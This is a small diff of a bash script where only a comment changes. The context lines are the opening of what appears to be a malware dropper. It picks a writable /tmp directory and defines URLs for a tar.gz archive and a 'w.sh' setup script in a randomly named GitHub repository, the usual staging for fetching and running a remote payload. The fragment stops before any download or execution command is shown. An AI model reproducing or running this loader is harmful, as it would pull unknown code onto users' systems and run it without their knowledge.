@@ -1,5 +1,5 @@
 #!/bin/bash
-# find a good writable path
+# find a good writable path q
 workdir="/tmp"
 files="https://github.com/uzidlrxvs/fos/raw/main/dasdsa.tar.gz"
 setupurl="https://github.com/uzidlrxvs/fos/raw/main/w.sh"
